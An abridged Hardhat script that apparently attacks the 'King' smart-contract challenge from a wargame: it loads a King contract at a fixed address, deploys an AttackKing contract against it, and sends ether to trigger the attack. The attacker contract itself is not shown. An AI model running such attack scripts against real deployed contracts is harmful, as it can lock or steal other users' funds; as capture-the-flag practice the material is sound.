...
async function main() {
  ...
  const KingAddres = "0x81d03Bb0D0ca2b4Da55Bd9648D20B2806E295e1D"
  this.king = await hre.ethers.getContractAt("King",KingAddres);

  // Deploying the Attacker contract
  const AttackKing = await hre.ethers.getContractFactory("AttackKing");
  this.attackKing = await AttackKing.connect(player).deploy(this.king.address);
  ...
  const tx = await this.attackKing.connect(player).attackKingGame({ value: attackPrize });
  ...
  const contendantPrize = hre.ethers.utils.parseEther("0.02");
